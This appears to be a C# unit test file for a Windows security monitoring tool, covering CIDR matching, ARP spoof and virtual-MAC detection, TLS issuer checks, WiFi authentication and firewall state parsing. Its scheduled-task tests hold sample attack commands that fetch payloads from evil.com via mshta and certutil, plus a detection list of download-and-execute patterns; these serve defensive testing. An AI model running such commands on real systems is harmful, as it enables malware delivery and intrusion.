using System.Net;
using System.Reflection;
using WindowsSentinel.Core.Monitors;
using WindowsSentinel.Core.Interfaces;
using WindowsSentinel.Core.Models;
using Microsoft.Extensions.Logging.Abstractions;
using Moq;
using Xunit;

namespace WindowsSentinel.Tests.Monitors;

/// <summary>
/// Unit tests for v3.6.0 network protection monitors.
/// Tests the pure logic (CIDR matching, MAC parsing, state diffing)
/// without requiring actual network access or elevation.
/// </summary>
public sealed class NetworkProtectionTests
{
    // ═══════════════════════════════════════════════════════════════════════
    // DNS RESPONSE VALIDATION — CIDR MATCHING
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("142.250.80.46", "142.250.0.0/15", true)]   // Google IP in Google range
    [InlineData("8.8.8.8", "8.8.8.0/24", true)]             // Google DNS in its range
    [InlineData("1.1.1.1", "1.1.1.0/24", true)]             // Cloudflare in its range
    [InlineData("192.168.1.1", "142.250.0.0/15", false)]    // Private IP not in Google
    [InlineData("10.0.0.1", "1.1.1.0/24", false)]           // Private not in Cloudflare
    [InlineData("142.251.255.255", "142.250.0.0/15", true)]  // Edge of /15 range
    [InlineData("142.252.0.0", "142.250.0.0/15", false)]     // Just outside /15 range
    [InlineData("0.0.0.0", "0.0.0.0/0", true)]              // Default route matches all
    [InlineData("255.255.255.255", "0.0.0.0/0", true)]      // Default route matches all
    [InlineData("104.16.0.1", "104.16.0.0/12", true)]       // Cloudflare /12
    [InlineData("104.31.255.255", "104.16.0.0/12", true)]   // Edge of Cloudflare /12
    [InlineData("104.32.0.0", "104.16.0.0/12", false)]      // Just outside /12
    public void IsInCidr_CorrectlyMatches(string ipStr, string cidr, bool expected)
    {
        var ip = IPAddress.Parse(ipStr);
        var result = InvokeIsInCidr(ip, cidr);
        Assert.Equal(expected, result);
    }

    [Theory]
    [InlineData("not_an_ip", "1.1.1.0/24")]
    [InlineData("1.1.1.1", "invalid")]
    [InlineData("1.1.1.1", "1.1.1.0")]       // No prefix length
    [InlineData("1.1.1.1", "1.1.1.0/abc")]   // Non-numeric prefix
    public void IsInCidr_ReturnsFalse_OnInvalidInput(string ipStr, string cidr)
    {
        // Invalid IPs should not crash, just return false
        if (IPAddress.TryParse(ipStr, out var ip))
        {
            var result = InvokeIsInCidr(ip, cidr);
            Assert.False(result);
        }
    }

    [Fact]
    public void IsInCidr_HandlesSlash32_ExactMatch()
    {
        var ip = IPAddress.Parse("8.8.8.8");
        Assert.True(InvokeIsInCidr(ip, "8.8.8.8/32"));
        Assert.False(InvokeIsInCidr(ip, "8.8.8.9/32"));
    }

    [Fact]
    public void IsInCidr_HandlesSlash0_MatchesEverything()
    {
        var ip = IPAddress.Parse("192.168.1.1");
        Assert.True(InvokeIsInCidr(ip, "0.0.0.0/0"));
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ARP SPOOF MONITOR — MAC FORMATTING
    // ═══════════════════════════════════════════════════════════════════════

    [Fact]
    public void FormatMac_FormatsCorrectly()
    {
        var bytes = new byte[] { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00 };
        var result = InvokeFormatMac(bytes, 6);
        Assert.Equal("AA:BB:CC:DD:EE:FF", result);
    }

    [Fact]
    public void FormatMac_HandlesNullBytes()
    {
        var result = InvokeFormatMac(null!, 0);
        Assert.Equal("00:00:00:00:00:00", result);
    }

    [Fact]
    public void FormatMac_HandlesZeroLength()
    {
        var bytes = new byte[] { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x00 };
        var result = InvokeFormatMac(bytes, 0);
        Assert.Equal("00:00:00:00:00:00", result);
    }

    [Fact]
    public void FormatMac_HandlesPartialLength()
    {
        var bytes = new byte[] { 0x01, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00 };
        var result = InvokeFormatMac(bytes, 3);
        Assert.Equal("01:02:03", result);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ARP SPOOF MONITOR — SUSPICIOUS OUI DETECTION
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("00:50:56:AA:BB:CC", true)]   // VMware
    [InlineData("00:0C:29:11:22:33", true)]   // VMware
    [InlineData("08:00:27:AA:BB:CC", true)]   // VirtualBox
    [InlineData("52:54:00:11:22:33", true)]   // QEMU/KVM
    [InlineData("00:16:3E:AA:BB:CC", true)]   // Xen
    [InlineData("00:15:5D:AA:BB:CC", true)]   // Hyper-V
    [InlineData("02:42:AC:11:22:33", true)]   // Docker
    [InlineData("D4:5D:64:AA:BB:CC", false)]  // Real hardware (ASUSTek)
    [InlineData("3C:7C:3F:AA:BB:CC", false)]  // Real hardware (Intel)
    [InlineData("AA:BB:CC:DD:EE:FF", false)]  // Random
    public void SuspiciousOui_DetectsVirtualMacs(string mac, bool expectedSuspicious)
    {
        var suspiciousOuis = new[]
        {
            "00:50:56", "00:0C:29", "08:00:27", "52:54:00",
            "00:16:3E", "00:15:5D", "02:42:AC"
        };

        var isSuspicious = suspiciousOuis.Any(oui =>
            mac.StartsWith(oui, StringComparison.OrdinalIgnoreCase));

        Assert.Equal(expectedSuspicious, isSuspicious);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // PUBLIC IP MONITOR — CLOUDFLARE TRACE PARSING
    // ═══════════════════════════════════════════════════════════════════════

    [Fact]
    public void ParseCloudflareTrace_ExtractsIpAndLocation()
    {
        var trace = "fl=123f456\n" +
                    "h=1.1.1.1\n" +
                    "ip=203.0.113.42\n" +
                    "ts=1716566400.123\n" +
                    "visit_scheme=https\n" +
                    "uag=WindowsSentinel/3.6.0\n" +
                    "colo=ZAG\n" +
                    "sliver=none\n" +
                    "http=http/2\n" +
                    "loc=HR\n" +
                    "tls=TLSv1.3\n" +
                    "sni=plaintext\n" +
                    "warp=off\n";

        var (ip, country, colo) = ParseCloudflareTraceHelper(trace);

        Assert.Equal("203.0.113.42", ip);
        Assert.Equal("HR", country);
        Assert.Equal("ZAG", colo);
    }

    [Fact]
    public void ParseCloudflareTrace_HandlesEmptyResponse()
    {
        var (ip, country, colo) = ParseCloudflareTraceHelper("");
        Assert.Null(ip);
    }

    [Fact]
    public void ParseCloudflareTrace_HandlesMalformedResponse()
    {
        var (ip, country, colo) = ParseCloudflareTraceHelper("garbage data\nno equals signs\n");
        Assert.Null(ip);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ROUTE TABLE MONITOR — VIRTUAL ADAPTER FILTERING
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("VPN Client Adapter", true)]
    [InlineData("TAP-Windows Adapter V9", true)]
    [InlineData("WireGuard Tunnel", true)]
    [InlineData("Hyper-V Virtual Ethernet Adapter", true)]
    [InlineData("Docker NAT", true)]
    [InlineData("Intel(R) Wi-Fi 6 AX201", false)]
    [InlineData("Realtek PCIe GbE Family Controller", false)]
    [InlineData("Qualcomm Atheros QCA9377", false)]
    public void VirtualAdapterDetection_CorrectlyFilters(string adapterName, bool expectedVirtual)
    {
        var virtualFragments = new[]
        {
            "VPN", "TAP", "TUN", "WireGuard", "OpenVPN",
            "Hyper-V", "vEthernet", "Docker", "WSL",
            "VMware", "VirtualBox", "Cisco AnyConnect",
            "Fortinet", "Pulse Secure", "GlobalProtect",
            "NordVPN", "ExpressVPN", "Surfshark",
        };

        var isVirtual = virtualFragments.Any(f =>
            adapterName.Contains(f, StringComparison.OrdinalIgnoreCase));

        Assert.Equal(expectedVirtual, isVirtual);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // TLS CERTIFICATE MONITOR — ISSUER MATCHING
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("CN=GTS CA 1C3, O=Google Trust Services LLC", new[] { "Google Trust Services", "GTS CA" }, true)]
    [InlineData("CN=DigiCert SHA2 Extended Validation Server CA", new[] { "DigiCert", "Cloudflare" }, true)]
    [InlineData("CN=Evil Corp Root CA", new[] { "Google Trust Services", "GTS CA", "GlobalSign" }, false)]
    [InlineData("CN=Zscaler Intermediate Root CA", new[] { "Google Trust Services" }, false)]
    public void IssuerMatching_CorrectlyIdentifiesExpected(string issuer, string[] expected, bool shouldMatch)
    {
        var matches = expected.Any(e => issuer.Contains(e, StringComparison.OrdinalIgnoreCase));
        Assert.Equal(shouldMatch, matches);
    }

    [Theory]
    [InlineData("CN=Zscaler Intermediate Root CA", true)]
    [InlineData("CN=BlueCoat SSL Visibility", true)]
    [InlineData("CN=Palo Alto Networks CA", true)]
    [InlineData("CN=Fortinet CA", true)]
    [InlineData("CN=Let's Encrypt Authority X3", false)]
    [InlineData("CN=DigiCert Global Root G2", false)]
    public void EnterpriseCaDetection_CorrectlyIdentifies(string issuer, bool expectedEnterprise)
    {
        var enterpriseCAs = new[]
        {
            "Zscaler", "BlueCoat", "Symantec", "Forcepoint",
            "Palo Alto", "Fortinet", "FortiGate",
            "Cisco Umbrella", "Websense", "McAfee",
            "Check Point", "Sophos", "Barracuda",
            "Netskope", "iboss", "ContentKeeper",
        };

        var isEnterprise = enterpriseCAs.Any(ca =>
            issuer.Contains(ca, StringComparison.OrdinalIgnoreCase));

        Assert.Equal(expectedEnterprise, isEnterprise);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WIFI SECURITY MONITOR — AUTHENTICATION CLASSIFICATION
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("Open", true)]
    [InlineData("open", true)]
    [InlineData("None", true)]
    [InlineData("WPA2-Personal", false)]
    [InlineData("WPA3-SAE", false)]
    [InlineData("RSNA", false)]
    public void WifiAuth_CorrectlyIdentifiesOpenNetworks(string auth, bool expectedOpen)
    {
        var lower = auth.ToLowerInvariant();
        var isOpen = lower.Contains("open") || lower == "none";
        Assert.Equal(expectedOpen, isOpen);
    }

    [Theory]
    [InlineData("WPA2-Personal", true)]
    [InlineData("WPA3-SAE", true)]
    [InlineData("RSNA", true)]
    [InlineData("Open", false)]
    [InlineData("WEP", false)]
    [InlineData("None", false)]
    public void WifiAuth_CorrectlyIdentifiesStrongAuth(string auth, bool expectedStrong)
    {
        var lower = auth.ToLowerInvariant();
        var isStrong = lower.Contains("wpa2") || lower.Contains("wpa3") || lower.Contains("rsna");
        Assert.Equal(expectedStrong, isStrong);
    }

    [Theory]
    [InlineData("Open", true)]
    [InlineData("WEP", true)]
    [InlineData("None", true)]
    [InlineData("WPA2-Personal", false)]
    [InlineData("WPA3-SAE", false)]
    public void WifiAuth_CorrectlyIdentifiesWeakAuth(string auth, bool expectedWeak)
    {
        var lower = auth.ToLowerInvariant();
        var isWeak = lower.Contains("open") || lower.Contains("wep") || lower == "none";
        Assert.Equal(expectedWeak, isWeak);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // BLUETOOTH MONITOR — HID DEVICE CLASSIFICATION
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData(0x002540, true)]   // Major class 5 (Peripheral) = keyboard/mouse
    [InlineData(0x000540, true)]   // Major class 5
    [InlineData(0x000100, false)]  // Major class 0 (Misc)
    [InlineData(0x000200, false)]  // Major class 1 (Computer)
    [InlineData(0x000400, false)]  // Major class 2 (Phone)
    [InlineData(0x000600, false)]  // Major class 3 (LAN/Network)
    [InlineData(0x000800, false)]  // Major class 4 (Audio/Video)
    public void BluetoothClassOfDevice_CorrectlyIdentifiesHid(int classOfDevice, bool expectedHid)
    {
        var majorClass = (classOfDevice >> 8) & 0x1F;
        var isHid = majorClass == 5; // 5 = Peripheral
        Assert.Equal(expectedHid, isHid);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // SCHEDULED TASK MONITOR — SUSPICIOUS COMMAND ANALYSIS
    // ═══════════════════════════════════════════════════════════════════════

    [Theory]
    [InlineData("powershell.exe -encodedcommand JABjAGwA", true)]
    [InlineData("cmd /c whoami > C:\\temp\\out.txt", true)]
    [InlineData("mshta http://evil.com/payload.hta", true)]
    [InlineData("certutil -urlcache -split -f http://evil.com/x.exe", true)]
    [InlineData("C:\\Program Files\\MyApp\\app.exe", false)]
    [InlineData("notepad.exe", false)]
    public void ScheduledTask_DetectsSuspiciousCommands(string action, bool expectedSuspicious)
    {
        var suspiciousPatterns = new[]
        {
            "-encodedcommand", "-enc ", "-e ",
            "powershell -w hidden", "powershell.exe -w h",
            "cmd /c", "cmd.exe /c",
            "mshta ", "wscript ", "cscript ",
            "regsvr32 ", "rundll32 ",
            "certutil ", "bitsadmin ",
            "iex(", "invoke-expression",
            "downloadstring", "downloadfile",
            "net user ", "net localgroup ",
        };

        var isSuspicious = suspiciousPatterns.Any(p =>
            action.Contains(p, StringComparison.OrdinalIgnoreCase));

        Assert.Equal(expectedSuspicious, isSuspicious);
    }

    [Theory]
    [InlineData(@"C:\Users\user\AppData\Local\Temp\malware.exe", true)]
    [InlineData(@"C:\Windows\Temp\payload.exe", true)]
    [InlineData(@"C:\Users\Public\evil.exe", true)]
    [InlineData(@"C:\Program Files\MyApp\app.exe", false)]
    [InlineData(@"C:\Windows\System32\svchost.exe", false)]
    public void ScheduledTask_DetectsSuspiciousPaths(string path, bool expectedSuspicious)
    {
        var suspiciousFragments = new[]
        {
            @"\Temp\", @"\tmp\", @"\AppData\Local\Temp\",
            @"\Downloads\", @"\Desktop\",
            @"\ProgramData\",
            @"\Users\Public\",
            @"C:\Windows\Temp\",
        };

        var isSuspicious = suspiciousFragments.Any(f =>
            path.Contains(f, StringComparison.OrdinalIgnoreCase));

        Assert.Equal(expectedSuspicious, isSuspicious);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FIREWALL MONITOR — STATE PARSING
    // ═══════════════════════════════════════════════════════════════════════

    [Fact]
    public void FirewallState_ParsesAllProfiles()
    {
        var output = @"
Domain Profile Settings:
----------------------------------------------------------------------
State                                 ON

Private Profile Settings:
----------------------------------------------------------------------
State                                 ON

Public Profile Settings:
----------------------------------------------------------------------
State                                 OFF
";
        // Simulate parsing
        var lines = output.Split('\n');
        bool? domain = null, priv = null, pub = null;
        string? currentProfile = null;

        foreach (var line in lines)
        {
            var trimmed = line.Trim();
            if (trimmed.Contains("Domain Profile", StringComparison.OrdinalIgnoreCase))
                currentProfile = "domain";
            else if (trimmed.Contains("Private Profile", StringComparison.OrdinalIgnoreCase))
                currentProfile = "private";
            else if (trimmed.Contains("Public Profile", StringComparison.OrdinalIgnoreCase))
                currentProfile = "public";
            else if (trimmed.StartsWith("State", StringComparison.OrdinalIgnoreCase))
            {
                var isOn = trimmed.Contains("ON", StringComparison.OrdinalIgnoreCase);
                switch (currentProfile)
                {
                    case "domain": domain = isOn; break;
                    case "private": priv = isOn; break;
                    case "public": pub = isOn; break;
                }
            }
        }

        Assert.True(domain);
        Assert.True(priv);
        Assert.False(pub);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DEDUPLICATION LOGIC
    // ═══════════════════════════════════════════════════════════════════════

    [Fact]
    public void AlertDeduplication_PreventsRepeatedAlerts()
    {
        var alertCache = new System.Collections.Concurrent.ConcurrentDictionary<string, DateTimeOffset>();
        var dedupeWindow = TimeSpan.FromMinutes(5);

        var key = "gw_mac_change:192.168.1.1:AA:BB:CC:DD:EE:FF";

        // First alert should succeed
        var firstResult = !alertCache.ContainsKey(key);
        alertCache.TryAdd(key, DateTimeOffset.UtcNow);
        Assert.True(firstResult);

        // Second alert with same key should be suppressed
        var secondResult = !alertCache.ContainsKey(key);
        Assert.False(secondResult);
    }

    [Fact]
    public void AlertDeduplication_AllowsAfterWindowExpires()
    {
        var alertCache = new System.Collections.Concurrent.ConcurrentDictionary<string, DateTimeOffset>();
        var dedupeWindow = TimeSpan.FromMinutes(5);

        var key = "test_alert";

        // Add with timestamp in the past (beyond window)
        alertCache.TryAdd(key, DateTimeOffset.UtcNow.AddMinutes(-10));

        // Prune expired entries
        var cutoff = DateTimeOffset.UtcNow - dedupeWindow;
        foreach (var kvp in alertCache)
        {
            if (kvp.Value < cutoff)
                alertCache.TryRemove(kvp.Key, out _);
        }

        // Should now be allowed
        Assert.False(alertCache.ContainsKey(key));
    }

    // ═══════════════════════════════════════════════════════════════════════
    // HELPERS — Reflection to access private static methods
    // ═══════════════════════════════════════════════════════════════════════

    private static bool InvokeIsInCidr(IPAddress ip, string cidr)
    {
        var method = typeof(DnsResponseValidationMonitor)
            .GetMethod("IsInCidr", BindingFlags.NonPublic | BindingFlags.Static);
        Assert.NotNull(method);
        return (bool)method!.Invoke(null, new object[] { ip, cidr })!;
    }

    private static string InvokeFormatMac(byte[] bytes, int length)
    {
        var method = typeof(ArpSpoofMonitor)
            .GetMethod("FormatMac", BindingFlags.NonPublic | BindingFlags.Static);
        Assert.NotNull(method);
        return (string)method!.Invoke(null, new object[] { bytes, length })!;
    }

    private static (string? ip, string? country, string? colo) ParseCloudflareTraceHelper(string trace)
    {
        string? ip = null, loc = null, colo = null;

        foreach (var line in trace.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            if (line.StartsWith("ip=", StringComparison.Ordinal))
                ip = line[3..].Trim();
            else if (line.StartsWith("loc=", StringComparison.Ordinal))
                loc = line[4..].Trim();
            else if (line.StartsWith("colo=", StringComparison.Ordinal))
                colo = line[5..].Trim();
        }

        return (ip, loc, colo);
    }
}
